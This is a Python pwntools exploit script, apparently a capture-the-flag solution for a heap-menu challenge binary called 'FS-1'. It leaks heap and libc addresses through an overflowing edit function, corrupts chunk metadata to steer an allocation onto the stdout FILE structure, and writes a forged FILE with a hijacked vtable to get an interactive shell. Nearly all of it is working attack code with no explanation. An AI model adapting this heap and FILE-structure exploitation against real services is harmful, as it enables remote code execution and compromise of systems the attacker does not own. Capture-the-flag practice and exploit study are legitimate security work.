#!/usr/bin/python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./FS-1')
context.terminal = ['kitty', '-e', 'sh', '-c']
host = args.HOST or '0.0.0.0'
port = int(args.PORT or 1111)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
# tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

def choose_option(choice):
	io.recvuntil("[4]")
	io.sendline(str(choice))

def add(idx, size, content):
	choose_option(1)
	io.recvline()
	io.sendline(str(idx))
	io.recvline()
	io.sendline(str(size))
	io.recvline()
	io.send(content)
	
def delete(idx):
	choose_option(3)
	io.recvline()
	io.sendline(str(idx))

def edit(idx, size, content):
	choose_option(2)
	io.recvline()
	io.sendline(str(idx))
	io.recvline()
	io.sendline(str(size))
	io.recvline()
	io.send(content)

def show(idx):
	choose_option(4)
	io.recvuntil("Please state the order to show?\n")
	io.sendline(str(idx))
	return(io.recvline())
libc = ELF("./libc.so.6")
io = start()
io.sendlineafter(": ", p64(0xdeadbeef))
add(1, 32, "A"*32)
add(2, 32, "B"*32)
add(3, 32, "C"*32)
delete(3)
delete(2)
edit(1, 64, "PPPPPPPPPPPPPPPP" * 3)
leak = show(1).strip(b"PPPPPPPPPPPPPPPP")[:-1] + b'\x00\x00'
heap_base = u64(leak) - 0x80
top_chunk = heap_base + 0x2b0
log.info(f"HEAP LEAK : {hex(heap_base)} ")
edit(1, 64, b"PPPPPPPPPPPPPPPP" * 2 + p64(0x0) + p64(0x31))
for i in range(4):
	delete(i)

add(0,0x60,"A")
add(1,0x60,"B")
add(2,0x60,"C")
add(3,0x60,"D")
edit(0,0x70,p64(0x0)*13 + p64(0xe1))

delete(1)

add(1,0x60,"B")

leak = show(2)[:-1] + b'\x00\x00'
libc_leak = u64(leak)
libc.address = libc_leak - 0x3c4038 - 0xb40
log.info(f"LIBC BASE : {hex(libc.address)} ")
add(3, 32, "C"*32)
add(3, 32, "C"*32)
add(3, 32, "X"*32)
add(3, 0x60, "Z"*0x60)
add(0, 0x30, "FUCKFUCK")
print(hex(top_chunk))
# pause()

edit(0, 512, b"\x00"*0x38 + p64(0xffffffffffffffff))
ABS = libc.address + 0x3c4018 + 12
ABS = libc.address + 0x3c5620
target = (libc.sym['_IO_2_1_stdout_'] - top_chunk - 32)
print(hex(target))
system       = libc.sym["system"]
bin_sh       = next(libc.search(b"/bin/sh"))
stdout       = libc.sym["_IO_2_1_stdout_"]
stdin        = libc.sym["_IO_2_1_stdin_"]
stdfile_lock = libc.sym["_IO_stdfile_1_lock"]
wide_data    = libc.sym["_IO_wide_data_1"]
io_str_jumps = libc.sym["_IO_str_jumps"]
fake  = p64(0xfbad2886) # original _flags & ~_IO_USER_BUF
fake += p64(stdout) * 4 # _IO_read_ptr to _IO_write_base
fake += p64((bin_sh - 100) // 2) # _IO_write_ptr
fake += p64(0) * 2 # _IO_write_end and _IO_buf_base
fake += p64((bin_sh - 100) // 2) # _IO_buf_end
fake += p64(0) * 4 # _IO_save_base to _markers
fake += p64(stdin) # _chain
fake += p32(1) # _fileno
fake += p32(0) # _flags2
fake += p64(0xffffffffffffffff) # _old_offset
fake += p16(0) # _cur_column
fake += p8(0) # _vtable_offset
fake += b'\n' # _shortbuf
fake += p32(0) # padding between shortbuf and _lock
fake += p64(stdfile_lock) # _lock
fake += p64(0xffffffffffffffff) # _offset
fake += p64(0) # _codecvt
fake += p64(wide_data) # _wide_data
fake += p64(0) # _freeres_list
fake += p64(0) #_freeres_buf
fake += p64(0) #__pad5
fake += p32(0xffffffff) # _mode
fake += b'\0'*20 # _unused2
fake += p64(io_str_jumps) # vtable
fake += p64(libc.address + 0x4527a) # _s._allocate_buffer
fake += p64(stdout) # _s._free_buffer
add(1, target, b"LOWDA")
add(1, 32, p64(0x00000000fbad2887))
edit(1, 512, fake)
io.interactive()